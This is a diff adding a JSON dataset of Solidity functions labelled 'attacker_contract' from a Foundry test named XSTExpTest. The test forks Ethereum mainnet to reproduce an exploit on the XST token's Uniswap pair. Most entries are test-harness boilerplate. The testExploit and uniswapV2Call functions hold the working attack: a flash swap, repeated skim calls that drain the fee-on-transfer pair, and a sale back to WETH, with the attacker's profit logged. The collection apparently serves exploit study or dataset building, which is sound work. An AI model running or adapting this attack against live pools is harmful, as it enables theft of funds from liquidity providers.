@@ -1,0 +1,100 @@
+[
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15_310_016);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Attacker WETH profit before exploit\", WETH.balanceOf(address(this)), 18);\n\n        amount = WETH.balanceOf(address(Pair2));\n        Pair1.swap(amount * 2, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"Attacker WETH profit after exploit\", WETH.balanceOf(address(this)), 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XSTExpTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV2Call",
+    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        // swap WETH to XST\n        uint256 amountSellWETH = WETH.balanceOf(address(this));\n        (uint256 reserve0, uint256 reserve1,) = Pair2.getReserves(); // r0 : XST r1 WETH\n        uint256 amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);\n        WETH.transfer(address(Pair2), amountSellWETH);\n        Pair2.swap(amountOutXST, 0, address(this), \"\");\n\n        //XST skim\n        XST.transfer(address(Pair2), XST.balanceOf(address(this)) / 8);\n        for (int256 i = 0; i < 15; i++) {\n            Pair2.skim(address(Pair2));\n        }\n        Pair2.skim(address(this));\n\n        // sell XST to WETH\n        // XST is SupportFeeOn Token\n        XST.transfer(address(Pair2), XST.balanceOf(address(this)));\n        uint256 balanceOfXST = XST.balanceOf(address(Pair2));\n        (uint256 reserve3, uint256 reserve4,) = Pair2.getReserves(); // r3 : XST r4 WETH\n        uint256 amountSellXST = balanceOfXST - reserve3;\n        uint256 amountOutWETH = amountSellXST * 997 * reserve4 / (reserve3 * 1000 + amountSellXST * 997);\n        Pair2.swap(0, amountOutWETH, address(this), \"\");\n\n        // repay falshswap\n        WETH.balanceOf(address(this));\n        WETH.transfer(address(Pair1), (amount * 2) * 1000 / 997 + 1000);\n    }\n",
+    "description": ""
+  }
+]
